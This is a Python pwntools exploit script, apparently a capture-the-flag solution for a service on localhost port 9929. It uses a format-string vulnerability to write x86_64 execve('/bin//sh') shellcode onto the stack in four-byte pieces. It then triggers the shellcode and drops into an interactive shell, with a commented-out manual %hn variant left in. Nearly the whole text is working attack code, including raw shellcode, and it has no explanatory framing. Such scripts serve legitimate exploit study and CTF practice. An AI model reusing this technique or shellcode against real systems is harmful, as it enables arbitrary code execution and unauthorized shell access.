#!/usr/bin/env python3

from pwn import *
context.arch = 'x86_64'
context.log_level = 'debug'

class ProbIO:
    def __init__(self, r):
        self.r = r
        self.sla = lambda t, x: self.r.sendlineafter(t, x)
        self.sl = lambda x: self.r.sendline(x)

    def enter(self, content, read=False):
        self.sla("Enter: ", content)
        if read:
            self.r.recvuntil("Entered: ")
            print(self.r.recvline())

    def enterEx(self, content):
        self.sl(content)
        
class Primitives:
    def __init__(self, io):
        self.io = io

    def enterOnly(self, content): return self.io.enter(content, False)
    def enterRead(self, content): return self.io.enter(content, True)
    def enterEx(self, content): return self.io.enterEx(content)

def exploit(pri):
    pause()
    offset = 8
    stack = 0x50510000
    sc = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

    # step 1
    """
    sc1 = u32(sc[:4])
    payload = f"%{sc1}c".encode()
    payload += b"%11$hn"
    payload += b"A" * (24 - len(payload))
    payload += p64(stack+0x10)
    print(len(payload))
    print(payload)
    pri.enterOnly(payload)
    """
    payload = fmtstr_payload(8, {stack+0x10:sc[:4]})
    pri.enterOnly(payload)

    payload = fmtstr_payload(8, {stack+0x14:sc[4:8]})
    pri.enterOnly(payload)

    payload = fmtstr_payload(8, {stack+0x18:sc[8:12]})
    pri.enterOnly(payload)

    payload = fmtstr_payload(8, {stack+0x1c:sc[12:16]})
    pri.enterOnly(payload)

    payload = fmtstr_payload(8, {stack+0x20:sc[16:20]})
    pri.enterOnly(payload)

    payload = fmtstr_payload(8, {stack+0x24:sc[20:]})
    pri.enterOnly(payload)
    pause()

    pri.enterOnly("done")
    pri.io.r.interactive()

def main(r):
    io = ProbIO(r)
    pri = Primitives(io)
    exploit(pri)

if __name__ == "__main__":
    r = remote("localhost", 9929)
    main(r)
